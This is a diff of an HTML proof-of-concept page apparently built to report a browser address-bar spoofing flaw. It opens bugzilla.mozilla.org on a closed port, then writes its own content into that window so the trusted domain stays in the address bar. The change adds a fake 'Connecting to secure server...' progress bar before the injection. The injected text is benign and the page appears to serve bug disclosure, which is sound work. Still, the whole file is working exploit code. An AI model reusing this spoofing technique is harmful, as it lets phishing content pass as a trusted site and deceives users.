@@ -5,72 +5,108 @@
 <title>Navigation State Test</title>
 
 <style>
+
 body{
-  font-family:Arial;
-  text-align:center;
-  margin-top:120px;
+font-family:Arial;
+text-align:center;
+margin-top:120px;
 }
 
 button{
-  padding:14px 28px;
-  font-size:18px;
+padding:14px 28px;
+font-size:18px;
 }
 
-#log{
-  margin-top:30px;
-  color:#555;
+#loader{
+margin-top:30px;
+display:none;
 }
+
+#progress{
+width:320px;
+height:20px;
+border:1px solid #ccc;
+margin:auto;
+}
+
+#bar{
+width:0%;
+height:100%;
+background:#4CAF50;
+}
+
 </style>
 </head>
 
 <body>
 
-<h2>Navigation State Desync Test</h2>
+<h2>Navigation Desync Test</h2>
 
 <button onclick="start()">Start Test</button>
 
-<div id="log"></div>
+<div id="loader">
+
+<p>Connecting to secure server...</p>
+
+<div id="progress">
+<div id="bar"></div>
+</div>
+
+</div>
 
 <script>
 
-function log(msg){
-  document.getElementById("log").innerHTML += msg + "<br>";
-}
-
 function start(){
 
-  log("Opening new tab with unreachable port...");
+document.getElementById("loader").style.display="block";
 
-  // open trusted domain with closed port
-  let win = window.open("https://bugzilla.mozilla.org:90");
+let win = window.open("https://bugzilla.mozilla.org:90");
 
-  setTimeout(()=>{
+let bar=document.getElementById("bar");
+let width=0;
 
-    log("Attempting document injection...");
+let interval=setInterval(function(){
 
-    try{
+if(width>=100){
 
-      win.document.open();
-      win.document.write(`
-        <html>
-        <body style="font-family:Arial;text-align:center;margin-top:100px;">
-        <h2>Navigation Test Page</h2>
-        <p>This content was injected after a failed navigation.</p>
-        <p>If the address bar still shows the original domain, this demonstrates a navigation state issue.</p>
-        </body>
-        </html>
-      `);
-      win.document.close();
+clearInterval(interval);
 
-      log("Document injected.");
+inject(win);
 
-    }catch(e){
+}else{
 
-      log("Injection blocked by browser security.");
+width+=2;
+bar.style.width=width+"%";
 
-    }
+}
 
-  },2000);
+},140);
+
+}
+
+function inject(win){
+
+try{
+
+win.document.open();
+
+win.document.write(`
+<html>
+<body style="font-family:Arial;text-align:center;margin-top:120px;">
+<h2>Navigation State Demonstration</h2>
+<p>This content was injected after delayed navigation failure.</p>
+<p>If the address bar still shows the original domain, this demonstrates a navigation state issue.</p>
+</body>
+</html>
+`);
+
+win.document.close();
+
+}catch(e){
+
+alert("Injection blocked by browser security.");
+
+}
 
 }
 
